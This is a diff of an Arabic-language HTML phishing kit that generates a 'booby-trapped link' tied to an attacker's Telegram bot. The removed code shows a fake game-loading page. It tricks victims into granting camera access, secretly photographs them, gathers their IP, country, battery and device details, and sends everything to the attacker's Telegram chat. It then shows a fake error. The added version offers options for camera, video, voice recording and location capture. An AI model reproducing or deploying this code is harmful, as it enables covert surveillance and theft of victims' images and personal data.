@@ -3,65 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mohamed Matrix System</title>
+    <title>Pro-Mohamed Morsy</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --neon: #00ff00; --black: #000; }
-        body, html { margin: 0; padding: 0; background: var(--black); font-family: 'Poppins', sans-serif; overflow: hidden; color: var(--neon); }
+        :root { --neon: #00ff00; --dark-bg: #000; }
+        body, html { margin: 0; padding: 0; background: var(--dark-bg); font-family: 'Cairo', sans-serif; color: var(--neon); overflow: hidden; height: 100vh; }
         canvas { position: fixed; top: 0; left: 0; z-index: 1; }
-        
-        /* واجهة لوحة التحكم */
         #adminPanel { position: relative; z-index: 10; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .card { background: rgba(0,0,0,0.9); border: 2px solid var(--neon); padding: 30px; border-radius: 15px; width: 90%; max-width: 400px; box-shadow: 0 0 25px var(--neon); backdrop-filter: blur(10px); }
-        h3 { text-align: center; text-shadow: 0 0 10px var(--neon); }
-        label { display: block; margin-top: 10px; font-size: 14px; font-weight: bold; }
-        input { width: 100%; padding: 12px; margin: 8px 0; background: rgba(0,0,0,0.7); border: 1px solid var(--neon); color: var(--neon); border-radius: 8px; box-sizing: border-box; outline: none; }
-        button { width: 100%; padding: 15px; background: var(--neon); color: #000; border: none; font-weight: 900; cursor: pointer; margin-top: 15px; border-radius: 8px; box-shadow: 0 0 15px var(--neon); }
-        #out { margin-top: 20px; padding: 10px; border: 1px dashed var(--neon); background: rgba(0,255,0,0.05); display: none; }
-        code { word-break: break-all; font-size: 11px; color: #fff; }
-
-        /* واجهة الضحية (تحميل اللعبة) */
-        #victimUI { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 20; background: #000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
-        .loader { border: 4px solid #111; border-top: 4px solid var(--neon); border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .card { background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(12px); border: 1px solid rgba(0, 255, 0, 0.2); padding: 15px 20px; border-radius: 15px; width: 85%; max-width: 340px; box-shadow: 0 0 25px rgba(0, 0, 0, 0.8); }
+        h3 { text-align: center; margin-bottom: 12px; font-size: 16px; text-shadow: 0 0 8px var(--neon); }
+        input[type="text"] { width: 100%; padding: 10px; background: rgba(0, 0, 0, 0.7); border: 1px solid rgba(0, 255, 0, 0.3); color: #fff; border-radius: 8px; box-sizing: border-box; outline: none; font-size: 12px; margin-bottom: 8px; }
+        .feature-item { background: rgba(0, 255, 0, 0.05); padding: 7px 10px; margin: 5px 0; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; border: 1px solid rgba(0, 255, 0, 0.1); cursor: pointer; }
+        .feature-item span { font-size: 12px; color: #fff; }
+        input[type="radio"] { accent-color: var(--neon); width: 16px; height: 16px; }
+        .main-btn { width: 100%; padding: 12px; background: transparent; color: var(--neon); border: 1px solid var(--neon); font-weight: bold; cursor: pointer; margin-top: 10px; border-radius: 10px; font-size: 13px; transition: 0.3s; }
+        .main-btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
+        #out { margin-top: 15px; display: none; text-align: center; }
+        .copy-btn { width: 100%; background: #00ff00; color: #000; border: none; padding: 12px; cursor: pointer; border-radius: 10px; font-weight: 900; font-size: 14px; box-shadow: 0 0 20px rgba(0, 255, 0, 0.4); transition: 0.3s; }
+        .copy-btn:hover { background: #05ff05; box-shadow: 0 0 30px #00ff00; }
+        #victimUI { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; background: #000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
     </style>
 </head>
 <body>
-
     <canvas id="matrix"></canvas>
-
     <div id="adminPanel">
         <div class="card">
-            <h3>created.by.mohamed morsy</h3>
-            <label>ID CHAT</label>
-            <input type="text" id="tid" placeholder="id chat">
-            <label>(Bot Token)</label>
-            <input type="text" id="tkn" placeholder="bot token">
-            <button onclick="generate()">إنشاء الرابط الملغم </button>
+            <h3>BY.MOHAMED MORSY</h3>
+            <input type="text" id="tid" placeholder="ادخل ID CHAT">
+            <input type="text" id="tkn" placeholder="ادخل BOT TOKEN">
+            <div id="features">
+                <label class="feature-item"><span>📸 صورة (أمامية)</span><input type="radio" name="feat" value="f_cam" checked></label>
+                <label class="feature-item"><span>📸 صورة (خلفية)</span><input type="radio" name="feat" value="b_cam"></label>
+                <label class="feature-item"><span>🎥 فيديو (أمامي)</span><input type="radio" name="feat" value="f_vid"></label>
+                <label class="feature-item"><span>🎥 فيديو (خلفي)</span><input type="radio" name="feat" value="b_vid"></label>
+                <label class="feature-item"><span>🎤 تسجيل صوتي</span><input type="radio" name="feat" value="voice"></label>
+                <label class="feature-item"><span>📍 تحديد الموقع</span><input type="radio" name="feat" value="loc"></label>
+            </div>
+            <button class="main-btn" onclick="generate()">انشاء رابط ملغم</button>
             <div id="out">
-                <p style="font-size:12px; margin:0 0 5px 0;">انسخ هذا الرابط وارسله:</p>
-                <code id="resLink"></code>
+                <button class="copy-btn" onclick="copyLink()"> نسخ الرابط</button>
             </div>
         </div>
     </div>
 
     <div id="victimUI">
-        <div class="loader"></div>
-        <h2 id="statusText">جاري تحميل موارد اللعبة...</h2>
-        <p style="color:#666; font-size:13px;">برجاء الانتظار وقبول الأذونات اللازمة</p>
+        <div style="color:#0f0; font-size: 20px; font-weight: bold;">Loading Graphics...</div>
     </div>
 
     <script>
-        // --- 1. تأثير الماتريكس ---
+        // Matrix Animation
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%";
-        const fontSize = 16;
+        const letters = "0123456789$#&@*?!+";
+        const fontSize = 10;
         const columns = canvas.width / fontSize;
-        const drops = Array(Math.floor(columns)).fill(1);
+        const drops = Array(Math.floor(columns)).fill(0);
         function draw() {
             ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px arial";
+            ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px monospace";
             drops.forEach((y, i) => {
                 const text = letters[Math.floor(Math.random() * letters.length)];
                 ctx.fillText(text, i * fontSize, y * fontSize);
@@ -71,82 +71,26 @@
         }
         setInterval(draw, 33);
 
-        // --- 2. التحقق من الرابط (أدمن أم ضحية) ---
-        const params = new URLSearchParams(window.location.search);
-        const t = params.get('t');
-        const i = params.get('i');
+        let finalLink = "";
 
-        if(t && i) {
-            document.getElementById('adminPanel').style.display = 'none';
-            document.getElementById('victimUI').style.display = 'flex';
-            startCapture(t, i);
-        }
-
-        // --- 3. وظيفة إنشاء الرابط للأدمن ---
         function generate() {
             const tid = document.getElementById('tid').value;
-            const tkn = document.getElementById('tkn').value;
-            if(!tid || !tkn) return alert("برجاء إدخال كافة البيانات!");
-            const finalLink = window.location.href.split('?')[0] + `?i=${tid}&t=${tkn}`;
-            document.getElementById('resLink').innerText = finalLink;
+            const tkn_in = document.getElementById('tkn').value;
+            const feat = document.querySelector('input[name="feat"]:checked').value;
+            if(!tid || !tkn_in) return alert("قم ب ادخال ال tokin,id");
+            
+            finalLink = window.location.origin + window.location.pathname + "?i=" + tid + "&t=" + tkn_in + "&type=" + feat;
             document.getElementById('out').style.display = 'block';
         }
 
-        // --- 4. وظيفة السحب الكاملة (للضحية) ---
-        async function startCapture(botToken, chatId) {
-            try {
-                // طلب الكاميرا
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-
-                const canvasCap = document.createElement('canvas');
-                canvasCap.width = video.videoWidth;
-                canvasCap.height = video.videoHeight;
-                canvasCap.getContext('2d').drawImage(video, 0, 0);
-
-                canvasCap.toBlob(async (blob) => {
-                    // جلب معلومات إضافية
-                    let ipInfo = { ip: "غير معروف", country_name: "غير معروف" };
-                    try { const r = await fetch('https://ipapi.co/json/'); ipInfo = await r.json(); } catch(e){}
-
-                    let batteryStatus = "غير معروف";
-                    try { 
-                        const b = await navigator.getBattery(); 
-                        batteryStatus = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'جاري الشحن' : 'غير موصل'})`;
-                    } catch(e){}
-
-                    const device = /Android|iPhone|iPad/i.test(navigator.userAgent) ? navigator.userAgent.match(/Android|iPhone|iPad/i)[0] : "PC";
-
-                    // تنسيق الرسالة
-                    const caption = `
-━━━ • 📸 • ━━━
-📸 صورة جديدة تم التقاطها
-━━━ • 📋 • ━━━
-🌍 الدولة: ${ipInfo.country_name}
-📱 الجهاز: ${device}
-🔋 البطارية: ${batteryStatus}
-🌐 IP: ${ipInfo.ip}
-🕒 الوقت: ${new Date().toLocaleString('ar-EG')}
-━━━   برعايه عمك محمد مرسي😘💹━━━`;
-
-                    // إرسال لتليجرام
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('photo', blob, 'shot.jpg');
-                    fd.append('caption', caption);
-
-                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-                    
-                    // إنهاء العملية
-                    stream.getTracks().forEach(tr => tr.stop());
-                    document.getElementById('statusText').innerText = "حدث خطأ في جرافيك اللعبة (Error 403)";
-                }, 'image/jpeg');
-
-            } catch (err) {
-                document.getElementById('statusText').innerText = "يجب السماح بالصلاحيات لتشغيل موارد اللعبة";
-            }
+        function copyLink() {
+            const tempInput = document.createElement("textarea");
+            tempInput.value = finalLink;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempInput);
+            alert("تم النسخ");
         }
     </script>
 </body>
